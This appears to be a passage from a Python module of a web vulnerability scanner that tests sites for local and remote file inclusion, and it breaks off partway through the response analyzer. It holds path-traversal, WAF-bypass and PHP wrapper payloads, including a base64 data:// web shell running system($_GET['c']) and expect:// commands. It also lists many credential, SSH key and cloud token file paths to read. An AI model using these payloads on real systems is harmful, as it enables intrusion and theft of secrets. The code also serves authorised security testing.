"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                   LFI/RFI SCANNER v3.0 - GOD-MODE EDITION                    ║
║                Local/Remote File Inclusion Exploitation Engine               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Features:                                                                    ║
║  • Multi-OS Path Traversal (Linux, Windows, macOS, FreeBSD)                  ║
║  • 20+ Encoding Bypass Techniques (URL, Double, Unicode, Overlong)           ║
║  • PHP Wrapper Exploitation (15+ wrappers)                                   ║
║  • Log Poisoning Detection (Apache, Nginx, SSH, Mail)                        ║
║  • Null Byte Injection (Legacy PHP bypass)                                   ║
║  • WAF Detection + Bypass (12+ WAFs)                                         ║
║  • RFI Detection with OOB Callbacks                                          ║
║  • Proc/Self Exploitation (environ, fd, cmdline)                             ║
║  • Session File Inclusion                                                     ║
║  • Wrapper Chaining (zip, phar, data, expect)                                ║
║  • Source Code Disclosure                                                     ║
║  • Cross-Validation + Confidence Scoring (0-100)                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import asyncio
import base64
import binascii
import random
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import httpx

from scanning.findings import Finding, VulnType, VulnCategory, Severity
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.logger import get_logger
from utils.scan_client import get_scan_client
from utils.network_utils import resolve_base_url
from utils.rate_limiter import RateLimiter
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
from utils.payload_encoder import PayloadEncoder as BasePayloadEncoder

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)

# Version
LFI_SCANNER_VERSION = "3.0.0-GOD-MODE"


class LFIType(Enum):
    """Types of File Inclusion attacks."""
    PATH_TRAVERSAL = auto()      # Basic ../ traversal
    ABSOLUTE_PATH = auto()       # Direct /etc/passwd
    NULL_BYTE = auto()           # Null byte bypass
    DOUBLE_ENCODING = auto()     # %252e%252e%252f
    UNICODE_ENCODING = auto()    # Unicode bypass
    PHP_WRAPPER = auto()         # php://filter etc
    DATA_WRAPPER = auto()        # data:// RCE
    EXPECT_WRAPPER = auto()      # expect:// RCE
    PHAR_WRAPPER = auto()        # phar:// deserialization
    ZIP_WRAPPER = auto()         # zip:// LFI
    LOG_POISONING = auto()       # Log file injection
    SESSION_INCLUSION = auto()   # PHP session files
    PROC_SELF = auto()           # /proc/self/* exploitation
    ENVIRON = auto()             # /proc/self/environ
    FD_LEAK = auto()             # /proc/self/fd/*
    RFI = auto()                 # Remote File Inclusion


class TargetOS(Enum):
    """Target operating system."""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    FREEBSD = "freebsd"
    UNKNOWN = "unknown"


class PHPWrapper(Enum):
    """PHP stream wrappers."""
    FILTER = "php://filter"
    INPUT = "php://input"
    DATA = "data://"
    EXPECT = "expect://"
    PHAR = "phar://"
    ZIP = "zip://"
    ZLIB = "compress.zlib://"
    BZIP2 = "compress.bzip2://"
    GLOB = "glob://"
    SSH2 = "ssh2://"
    RAR = "rar://"
    OGG = "ogg://"
    FTP = "ftp://"
    FTPS = "ftps://"
    HTTP = "http://"
    HTTPS = "https://"


# WAFType - Use centralized version from scanner_helpers
# Keep local enum for backward compatibility with existing code
class WAFType(Enum):
    """WAF types for detection and bypass - wraps centralized version."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    F5_BIG_IP = "f5_bigip"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    AZURE_WAF = "azure_waf"
    WORDFENCE = "wordfence"
    COMODO = "comodo"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class LFIResult:
    """Result of an LFI test."""
    vulnerable: bool
    lfi_type: LFIType
    confidence: int  # 0-100
    payload: str
    evidence: list[str] = field(default_factory=list)
    file_content: Optional[str] = None
    target_os: Optional[TargetOS] = None
    wrapper_used: Optional[PHPWrapper] = None
    rce_possible: bool = False
    source_disclosed: bool = False


class WAFDetector:
    """
    WAF detection for LFI - uses centralized BaseWAFDetector.

    Provides backward-compatible API while leveraging comprehensive
    signatures from utils/scanner_helpers.py.
    """

    @classmethod
    def detect(cls, response: httpx.Response) -> Optional[WAFType]:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        if base_waf_type == BaseWAFType.NONE:
            return None
        return WAFType.from_base(base_waf_type)

    @classmethod
    def is_blocked(cls, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


class PayloadEncoder:
    """
    Encoding techniques for WAF bypass - uses centralized BasePayloadEncoder.

    Provides backward-compatible API while leveraging comprehensive
    encoding functions from utils/payload_encoder.py.
    """

    @staticmethod
    def url_encode(payload: str) -> str:
        """Standard URL encoding."""
        return BasePayloadEncoder.url_encode(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encoding."""
        return BasePayloadEncoder.double_url_encode(payload)

    @staticmethod
    def triple_url_encode(payload: str) -> str:
        """Triple URL encoding."""
        return BasePayloadEncoder.triple_url_encode(payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encoding (../ variations)."""
        return BasePayloadEncoder.unicode_escape(payload)

    @staticmethod
    def overlong_utf8(payload: str) -> str:
        """Overlong UTF-8 encoding."""
        return BasePayloadEncoder.overlong_utf8(payload)

    @staticmethod
    def utf16_encode(payload: str) -> str:
        """UTF-16 encoding."""
        return BasePayloadEncoder.utf16_encode(payload)

    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """Mixed encoding techniques."""
        variations = [
            payload.replace("../", "..%2f"),
            payload.replace("../", "%2e%2e/"),
            payload.replace("../", "%2e%2e%2f"),
            payload.replace("../", "..%252f"),
            payload.replace("../", ".%2e/"),
            payload.replace("../", "%2e./"),
        ]
        return random.choice(variations)

    @staticmethod
    def null_byte_variations(payload: str) -> list[str]:
        """Generate null byte injection variations."""
        return BasePayloadEncoder.null_byte_variations(payload)

    @classmethod
    def get_all_encodings(cls, payload: str) -> list[tuple[str, str]]:
        """Get all encoded variants of a payload."""
        encodings = [
            (payload, "original"),
            (cls.url_encode(payload), "url_encoded"),
            (cls.double_url_encode(payload), "double_encoded"),
            (cls.unicode_encode(payload), "unicode"),
            (cls.overlong_utf8(payload), "overlong_utf8"),
            (cls.utf16_encode(payload), "utf16"),
            (cls.mixed_encoding(payload), "mixed"),
        ]

        # Add null byte variations
        for null_payload in cls.null_byte_variations(payload)[:3]:
            encodings.append((null_payload, "null_byte"))

        # FN-M10 FIX: Additional encoding variations
        # Triple URL encoding (for multi-layer WAF bypass)
        triple_encoded = cls.url_encode(cls.url_encode(cls.url_encode(payload)))
        encodings.append((triple_encoded, "triple_encoded"))

        # Double-encoded null byte
        if "%00" not in payload:
            encodings.append((payload + "%2500", "double_null"))

        # Backslash variations (Windows paths)
        if "/" in payload:
            backslash_payload = payload.replace("/", "\\")
            encodings.append((backslash_payload, "backslash"))
            encodings.append((backslash_payload.replace("\\", "%5c"), "encoded_backslash"))

        # Path truncation attempts (long paths)
        if "../" in payload:
            long_path = "../" * 20 + payload.split("../")[-1]
            encodings.append((long_path, "path_truncation"))

        return encodings


class PayloadGenerator:
    """Generate comprehensive LFI/RFI payloads."""
    
    # Vulnerable parameters
    LFI_PARAMS = [
        # File parameters
        "file", "filename", "filepath", "path", "pathname", "dir", "directory",
        "folder", "root", "doc", "document", "docs", "pdf",
        # Include parameters
        "include", "inc", "require", "require_once", "include_once",
        # Page/View parameters
        "page", "pg", "p", "view", "show", "display", "content", "cont",
        # Template parameters  
        "template", "tpl", "tmpl", "layout", "skin", "theme", "style",
        # Module parameters
        "module", "mod", "plugin", "action", "act", "func", "function",
        # Language parameters
        "lang", "language", "locale", "loc", "l",
        # Load parameters
        "load", "read", "fetch", "retrieve", "get", "open", "source", "src",
        # Category/Section
        "cat", "category", "section", "board", "detail", "item",
        # Config parameters
        "config", "conf", "cfg", "ini", "settings",
        # Image/Media
        "image", "img", "pic", "photo", "icon", "avatar", "thumb",
        # Log parameters
        "log", "logfile", "debug",
        # Other
        "ruta", "archivo", "fichero", "pagina",  # Spanish
        "datei", "seite",  # German
        "fichier",  # French
    ]
    
    # Linux sensitive files
    LINUX_FILES = [
        # System files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/fstab",
        "/etc/issue",
        "/etc/motd",
        "/etc/crontab",
        "/etc/sudoers",
        "/etc/ssh/sshd_config",
        "/etc/ssh/ssh_config",
        "/etc/security/limits.conf",
        "/etc/security/access.conf",
        # Network
        "/etc/network/interfaces",
        "/etc/netplan/01-netcfg.yaml",
        "/etc/iptables/rules.v4",
        # User files
        "/root/.bash_history",
        "/root/.bashrc",
        "/root/.profile",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/known_hosts",
        "/home/user/.bash_history",
        "/home/user/.ssh/id_rsa",
        # Proc filesystem
        "/proc/version",
        "/proc/cmdline",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/net/tcp",
        "/proc/net/udp",
        "/proc/net/arp",
        "/proc/mounts",
        "/proc/cpuinfo",
        "/proc/meminfo",
        # Web server configs
        "/etc/apache2/apache2.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/etc/apache2/envvars",
        "/etc/apache2/ports.conf",
        "/etc/nginx/nginx.conf",
        "/etc/nginx/sites-enabled/default",
        "/etc/nginx/conf.d/default.conf",
        "/etc/httpd/conf/httpd.conf",
        "/usr/local/etc/apache22/httpd.conf",
        "/opt/lampp/etc/httpd.conf",
        # Log files
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/mail.log",
        "/var/log/cron.log",
        # PHP configs
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php/8.0/fpm/php.ini",
        "/etc/php/8.1/apache2/php.ini",
        "/usr/local/etc/php/php.ini",
        "/etc/php.ini",
        # Application files
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.htaccess",
        "/var/www/html/.env",
        "/var/www/.env",
        "/app/.env",
        "/opt/app/.env",
        # Database configs
        "/etc/mysql/my.cnf",
        "/etc/mysql/mysql.conf.d/mysqld.cnf",
        "/var/lib/mysql/mysql/user.MYD",
        # AWS/Cloud (2026-02-12: Expanded cloud paths)
        "/home/user/.aws/credentials",
        "/root/.aws/credentials",
        "/home/user/.aws/config",
        "/root/.aws/config",
        "/home/user/.aws/cli/cache/",
        # GCP Service Account
        "/home/user/.config/gcloud/credentials.db",
        "/home/user/.config/gcloud/application_default_credentials.json",
        "/root/.config/gcloud/application_default_credentials.json",
        "/etc/google/auth/application_default_credentials.json",
        # Azure
        "/home/user/.azure/accessTokens.json",
        "/home/user/.azure/azureProfile.json",
        "/root/.azure/accessTokens.json",
        "/root/.azure/azureProfile.json",
        # Kubernetes (expanded)
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/etc/kubernetes/admin.conf",
        "/etc/kubernetes/kubelet.conf",
        "/etc/kubernetes/controller-manager.conf",
        "/etc/kubernetes/scheduler.conf",
        "/root/.kube/config",
        "/home/user/.kube/config",
        # Cloud-init
        "/var/lib/cloud/instance/user-data.txt",
        "/var/lib/cloud/instance/scripts/runcmd",
        "/var/lib/cloud/data/instance-id",
        "/run/cloud-init/instance-data.json",
        # Terraform/Infrastructure
        "/root/.terraform.d/credentials.tfrc.json",
        "/home/user/.terraform.d/credentials.tfrc.json",
        # Vault/Consul
        "/etc/vault.d/config.hcl",
        "/root/.vault-token",
        "/etc/consul.d/config.json",
        # Docker
        "/.dockerenv",
        "/proc/1/cgroup",
    ]
    
    # Windows sensitive files
    WINDOWS_FILES = [
        # System files
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SECURITY",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\system.ini",
        "C:\\boot.ini",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\repair\\SYSTEM",
        # IIS
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        # User files
        "C:\\Users\\Administrator\\Desktop\\",
        "C:\\Users\\Administrator\\.ssh\\id_rsa",
        # Logs
        "C:\\Windows\\debug\\NetSetup.log",
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\Unattended.xml",
        "C:\\Windows\\System32\\sysprep\\sysprep.xml",
        "C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml",
        # XAMPP/WAMP
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\xampp\\php\\php.ini",
        "C:\\xampp\\mysql\\data\\mysql\\user.MYD",
        "C:\\wamp\\apache2\\conf\\httpd.conf",
        # Application configs
        "C:\\inetpub\\wwwroot\\config.php",
        "C:\\inetpub\\wwwroot\\wp-config.php",
        # Cloud credentials (2026-02-12)
        "C:\\Users\\Administrator\\.aws\\credentials",
        "C:\\Users\\Administrator\\.aws\\config",
        "C:\\Users\\Administrator\\.azure\\accessTokens.json",
        "C:\\Users\\Administrator\\.azure\\azureProfile.json",
        "C:\\Users\\Administrator\\.kube\\config",
        "C:\\Users\\Administrator\\.config\\gcloud\\application_default_credentials.json",
        "C:\\Users\\Administrator\\.terraform.d\\credentials.tfrc.json",
        # Azure Instance Metadata Service cache (Windows)
        "C:\\WindowsAzure\\Logs\\Plugins\\",
        "C:\\WindowsAzure\\Config\\",
    ]
    
    # PHP wrappers payloads
    PHP_WRAPPERS = {
        PHPWrapper.FILTER: [
            # Base64 encode
            "php://filter/convert.base64-encode/resource={file}",
            "php://filter/read=convert.base64-encode/resource={file}",
            # ROT13
            "php://filter/read=string.rot13/resource={file}",
            # Multiple filters
            "php://filter/convert.base64-encode|convert.base64-encode/resource={file}",
            "php://filter/string.rot13|convert.base64-encode/resource={file}",
            # Zlib
            "php://filter/zlib.deflate/convert.base64-encode/resource={file}",
            # Convert
            "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
            "php://filter/convert.iconv.utf-16le.utf-8/resource={file}",
            # Specific file targets
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/convert.base64-encode/resource=../includes/config.php",
            "php://filter/convert.base64-encode/resource=../.env",
        ],
        PHPWrapper.INPUT: [
            "php://input",
        ],
        PHPWrapper.DATA: [
            # Base64 encoded PHP code
            "data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==",  # <?php echo 'LFI_TEST'; ?>
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",  # system($_GET['c'])
            "data://text/plain,<?php echo 'LFI_TEST'; ?>",
            "data:text/plain,<?php echo 'LFI_TEST'; ?>",
        ],
        PHPWrapper.EXPECT: [
            "expect://id",
            "expect://whoami",
            "expect://pwd",
            "expect://ls",
            "expect://cat /etc/passwd",
        ],
        PHPWrapper.PHAR: [
            "phar://./test.phar/test.txt",
            "phar:///tmp/test.phar/test.txt",
            "phar://test.jpg/test.php",
        ],
        PHPWrapper.ZIP: [
            "zip://./test.zip#test.txt",
            "zip:///tmp/test.zip#test.txt",
            "zip://test.jpg#test.php",
        ],
        PHPWrapper.ZLIB: [
            "compress.zlib:///etc/passwd",
            "compress.zlib://./index.php",
        ],
        PHPWrapper.BZIP2: [
            "compress.bzip2:///etc/passwd",
        ],
        # 2026-02-16: Added missing wrappers for comprehensive PHP LFI testing
        PHPWrapper.GLOB: [
            # Glob pattern to enumerate files
            "glob:///etc/passwd*",
            "glob:///var/www/*",
            "glob:///var/www/html/*.php",
            "glob:///tmp/*",
            "glob://./*.php",
            "glob://../*",
        ],
        PHPWrapper.FTP: [
            # FTP wrapper for RFI (requires allow_url_include)
            "ftp://anonymous@localhost/",
            "ftp://anonymous:anonymous@localhost/pub/",
        ],
        PHPWrapper.HTTP: [
            # HTTP wrapper for RFI (requires allow_url_include)
            "http://localhost/",
            "http://127.0.0.1/",
        ],
        PHPWrapper.HTTPS: [
            # HTTPS wrapper for RFI
            "https://localhost/",
        ],
    }

    # ==========================================================================
    # PHP LEGACY LFI PAYLOADS (2026-02-16)
    # For DVWA, bWAPP, Mutillidae and legacy PHP applications
    # ==========================================================================

    PHP_LEGACY_LFI_PAYLOADS = [
        # Classic path traversal (most common in PHP)
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",

        # Null byte injection (PHP < 5.3.4)
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.php",
        "../../../etc/passwd%00.html",
        "../../../etc/passwd\x00",

        # Double encoding (common bypass)
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",

        # Path normalization bypass
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "....\\....\\....\\etc\\passwd",

        # Mixed encoding
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",

        # Windows paths
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\boot.ini",
        "C:\\windows\\win.ini",
        "C:\\boot.ini",

        # PHP source disclosure
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/read=convert.base64-encode/resource=../includes/database.php",

        # Symlink following via /proc
        "/proc/self/root/../../../etc/passwd",
        "/proc/self/cwd/../../../etc/passwd",
        "/proc/self/environ",
        "/proc/self/cmdline",

        # Apache/Nginx log files (for log poisoning)
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",

        # PHP session files
        "/var/lib/php/sessions/sess_",
        "/tmp/sess_",

        # Common sensitive files
        "/etc/shadow",
        "/etc/hosts",
        "../.env",
        "../../.env",
        "../../../.env",
        "../.git/config",
        "../../.git/config",
    ]

    # Log files for poisoning
    LOG_FILES = {
        "apache": [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/access.log",
            "/var/log/apache/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/usr/local/apache/logs/access_log",
            "/usr/local/apache2/logs/access_log",
            "/opt/lampp/logs/access_log",
        ],
        "nginx": [
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
        ],
        "ssh": [
            "/var/log/auth.log",
            "/var/log/secure",
        ],
        "mail": [
            "/var/log/mail.log",
            "/var/mail/www-data",
            "/var/spool/mail/www-data",
        ],
        "ftp": [
            "/var/log/vsftpd.log",
            "/var/log/proftpd/proftpd.log",
        ],
        "php": [
            "/var/log/php_errors.log",
            "/tmp/php_errors.log",
        ],
    }
    
    # Session file locations
    SESSION_PATHS = [
        "/var/lib/php/sessions/sess_{session_id}",
        "/var/lib/php5/sessions/sess_{session_id}",
        "/var/lib/php7/sessions/sess_{session_id}",
        "/tmp/sess_{session_id}",
        "/tmp/php/sess_{session_id}",
        "C:\\Windows\\Temp\\sess_{session_id}",
        "C:\\php\\sessions\\sess_{session_id}",
    ]
    
    # Path traversal patterns
    TRAVERSAL_PATTERNS = [
        "../" * i for i in range(1, 15)
    ] + [
        "..\\" * i for i in range(1, 15)
    ] + [
        "..../" * i for i in range(1, 10)
    ] + [
        "....\\/" * i for i in range(1, 10)
    ] + [
        "../" * i + "/" for i in range(1, 10)  # Extra slash
    ] + [
        "./.." * i + "/" for i in range(1, 10)  # Dot variations
    ]
    
    # Bypass patterns
    BYPASS_PATTERNS = [
        ("../", "....//"),
        ("../", "..;/"),
        ("../", "..%00/"),
        ("../", ".%2e/"),
        ("../", "%2e./"),
        ("../", "%2e%2e/"),
        ("../", "%2e%2e%2f"),
        ("../", "..%5c"),
        ("../", "..%255c"),
        ("../", "%252e%252e%252f"),
        ("../", "..%c0%af"),
        ("../", "..%c1%9c"),
        ("../", "..%c0%ae"),
        ("../", "%uff0e%uff0e/"),
        ("../", "\\..\\/"),
    ]
    
    @classmethod
    def generate_traversal_payloads(
        cls,
        target_file: str,
        depth: int = 10,
    ) -> list[tuple[str, str]]:
        """Generate path traversal payloads."""
        payloads = []
        
        # Basic traversal
        for i in range(1, depth + 1):
            base = "../" * i
            payloads.append((f"{base}{target_file.lstrip('/')}", f"Traversal depth {i}"))
        
        # Windows backslash
        for i in range(1, depth + 1):
            base = "..\\" * i
            payloads.append((f"{base}{target_file.lstrip('/')}", f"Windows traversal depth {i}"))
        
        # Mixed traversal
        for i in range(1, min(depth, 6)):
            base = "../..\\" * i
            payloads.append((f"{base}{target_file.lstrip('/')}", "Mixed traversal"))
        
        # Double dots variations
        variations = [
            "....//",
            "....\\\\",
            "..\\..\\/",
            "..../",
            "..;/",
        ]
        for var in variations:
            base = var * min(depth, 5)
            payloads.append((f"{base}{target_file.lstrip('/')}", f"Bypass: {var}"))

        # Null byte variations (bypass extension filters like .php/.txt appended)
        null_bytes = [
            "%00",           # URL-encoded null
            "%00.php",       # Null + fake extension
            "%00.html",      # Null + fake extension
            "%00.txt",       # Null + fake extension
            "%2500",         # Double-encoded null
            "\x00",          # Raw null byte
        ]
        for i in [3, 5, 8]:
            base = "../" * i
            for nb in null_bytes:
                payloads.append((f"{base}{target_file.lstrip('/')}{nb}", f"Null byte bypass depth {i}"))

        return payloads
    
    @classmethod
    def generate_wrapper_payloads(cls, target_file: str = None) -> list[tuple[str, str, PHPWrapper]]:
        """Generate PHP wrapper payloads."""
        payloads = []
        
        for wrapper, templates in cls.PHP_WRAPPERS.items():
            for template in templates:
                if "{file}" in template and target_file:
                    payload = template.format(file=target_file)
                    payloads.append((payload, f"{wrapper.value} wrapper", wrapper))
                elif "{file}" not in template:
                    payloads.append((template, f"{wrapper.value} wrapper", wrapper))
        
        return payloads
    
    @classmethod
    def generate_log_poisoning_paths(cls) -> list[tuple[str, str]]:
        """Generate log file paths for poisoning."""
        payloads = []
        
        for log_type, paths in cls.LOG_FILES.items():
            for path in paths:
                # Various traversal depths
                for depth in [3, 5, 7, 10]:
                    traversal = "../" * depth
                    payloads.append(
                        (f"{traversal}{path.lstrip('/')}", f"{log_type} log")
                    )
        
        return payloads


class ResponseAnalyzer:
    """Analyze responses for LFI indicators."""
    
    # File content signatures
    FILE_SIGNATURES = {
        "linux_passwd": [
            "root:x:0:0",
            "root:*:0:0",
            "daemon:x:1:1",
            "nobody:x:",
            "www-data:x:",
            "/bin/bash",
            "/bin/sh",
            "/usr/sbin/nologin",
        ],
        "linux_shadow": [
            "root:$",
            "root:!",
            "root:*:",
            ":0:0:99999:",
        ],
        "linux_group": [
            "root:x:0:",
            "daemon:x:1:",
            "adm:x:4:",
        ],
        "linux_hosts": [
            "127.0.0.1\tlocalhost",
            "::1\tlocalhost",
        ],
        "linux_proc": [
            "HOSTNAME=",
            "PATH=",
            "PWD=",
            "HOME=",
            "SHELL=",
            "USER=",
            "APACHE_",
            "PHP_",
            "SERVER_",
        ],
        "windows_hosts": [
            "# Copyright (c) 1993-",
            "localhost",
            "# localhost name resolution",
        ],
        "windows_ini": [
            "[fonts]",
            "[extensions]",
            "[mci extensions]",
            "[files]",
            "[Mail]",
        ],
        "php_source": [
            "<?php",
            "<?=",
            "<?PHP",
            "defined(",
            "require_once",
            "include_once",
            "$_GET",
            "$_POST",
            "$_REQUEST",
            "$_SERVER",
            "$_SESSION",
            "function ",
            "class ",
        ],
        "config_files": [
            "DB_HOST",
            "DB_USER",
            "DB_PASS",
            "DB_NAME",
            "MYSQL_",
            "APP_KEY",
            "APP_SECRET",
            "API_KEY",
            "AWS_ACCESS",
            "SECRET_KEY",
            "PASSWORD",
            "credentials",
        ],
        "apache_config": [
            "DocumentRoot",
            "ServerRoot",
            "ServerAdmin",
            "<VirtualHost",
            "<Directory",
            "LoadModule",
        ],
        "nginx_config": [
            "server {",
            "location /",
            "root /var/www",
            "fastcgi_pass",
            "proxy_pass",
        ],
        "ssh_keys": [
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "-----BEGIN DSA PRIVATE KEY-----",
            "-----BEGIN EC PRIVATE KEY-----",
            "ssh-rsa AAAA",
            "ssh-ed25519 AAAA",
        ],
    }
    
    # Error messages indicating LFI attempt
    ERROR_INDICATORS = [
        "failed to open stream",
        "no such file or directory",
        "file_get_contents",
        "include(",
        "require(",
        "fopen(",
        "readfile(",
        "file(",
        "fread(",
        "fpassthru(",
        "highlight_file(",
        "show_source(",
        "include_path",
        "open_basedir restriction",
        "permission denied",
        "not within the allowed path",
        "unable to open",
        "could not find",
        "cannot read file",
    ]
    
    @classmethod
    def analyze(
        cls,
        response: httpx.Response,
        payload: str,
        baseline_content: str = "",
    ) -> LFIResult:
        """Analyze response for LFI indicators."""
        content = response.text
        confidence = 0
        evidence = []
        target_os = None
        file_content = None
        rce_possible = False
        source_disclosed = False
        lfi_type = LFIType.PATH_TRAVERSAL
        wrapper_used = None
        
        # Determine LFI type from payload
        if "php://filter" in payload:
            lfi_type = LFIType.PHP_WRAPPER
            wrapper_used = PHPWrapper.FILTER
        elif "php://input" in payload:
            lfi_type = LFIType.PHP_WRAPPER
            wrapper_used = PHPWrapper.INPUT
            rce_possible = True
        elif "data://" in payload or "data:" in payload:
            lfi_type = LFIType.DATA_WRAPPER
            wrapper_used = PHPWrapper.DATA
            rce_possible = True
        elif "expect://" in payload:
            lfi_type = LFIType.EXPECT_WRAPPER
            wrapper_used = PHPWrapper.EXPECT
            rce_possible = True
        elif "phar://" in payload:
            lfi_type = LFIType.PHAR_WRAPPER
            wrapper_used = PHPWrapper.PHAR
            rce_possible = True
        elif "%00" in payload or "\x00" in payload:
            lfi_type = LFIType.NULL_BYTE
        elif "%252" in payload or "%25" in payload:
            lfi_type = LFIType.DOUBLE_ENCODING
        elif "%c0" in payload or "%u00" in payload:
            lfi_type = LFIType.UNICODE_ENCODING
        elif "/proc/self" in payload:
            lfi_type = LFIType.PROC_SELF
        elif "environ" in payload:
            lfi_type = LFIType.ENVIRON
        elif "/fd/" in payload:
            lfi_type = LFIType.FD_LEAK
        elif "log" in payload.lower():
            lfi_type = LFIType.LOG_POISONING
        elif "sess_" in payload:
            lfi_type = LFIType.SESSION_INCLUSION
        elif payload.startswith("http://") or payload.startswith("//"):
            lfi_type = LFIType.RFI
        elif payload.startswith("/"):
            lfi_type = LFIType.ABSOLUTE_PATH
        
        # Check for base64 encoded content (PHP filter)
        if wrapper_used == PHPWrapper.FILTER:
            # Look for base64 pattern
            base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
            match = re.search(base64_pattern, content)
            if match:
                try:
                    decoded = base64.b64decode(match.group()).decode('utf-8', errors='ignore')
                    # Check if decoded content looks like file content
                    for sig_type, signatures in cls.FILE_SIGNATURES.items():
                        for sig in signatures:
                            if sig in decoded:
                                evidence.append(f"Base64 decoded {sig_type}: {sig[:30]}...")
                                confidence += 30
                                file_content = decoded[:500]
                                source_disclosed = "php_source" in sig_type
                                break
                except (ValueError, UnicodeDecodeError, binascii.Error):
                    pass
        
        # Check for direct file content
        for sig_type, signatures in cls.FILE_SIGNATURES.items():
            for sig in signatures:
                if sig in content and sig not in baseline_content:
                    evidence.append(f"File content ({sig_type}): {sig[:30]}...")
                    confidence += 25
                    
                    # Determine OS
                    if "linux" in sig_type:
                        target_os = TargetOS.LINUX
                    elif "windows" in sig_type:
                        target_os = TargetOS.WINDOWS
                    
